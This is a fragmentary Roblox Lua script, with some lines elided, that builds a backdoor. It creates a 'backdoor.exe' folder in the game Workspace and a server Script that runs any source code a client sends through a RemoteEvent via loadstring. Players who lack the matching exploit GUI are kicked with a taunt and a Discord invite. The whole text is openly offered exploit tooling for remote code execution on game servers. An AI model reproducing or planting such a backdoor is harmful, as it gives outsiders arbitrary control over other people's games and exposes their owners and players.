...
local LocalBackdoor = Instance.new("Folder")

--Properties:

backdoorexe.Name = "backdoor.exe"
backdoorexe.Parent = game.Workspace
...
LocalBackdoor.Name = "Local Backdoor"
LocalBackdoor.Parent = backdoorexe
...
local function KURRFT_fake_script() -- LocalBackdoor.RemoteHandler 
	local script = Instance.new('Script', LocalBackdoor)
	local req = require
	...
	script.Parent.Remote.OnServerEvent:Connect(function(plr, source, env)
		if plr.PlayerGui:FindFirstChild("backdoor.exe") then
			Loadstring(source, env)()
		else
			plr:Kick("\nNo, get backdoor.exe like a real exploiter.\nhttps://discord.gg/6HndYgC")
		end
	end)
end
coroutine.wrap(KURRFT_fake_script)()
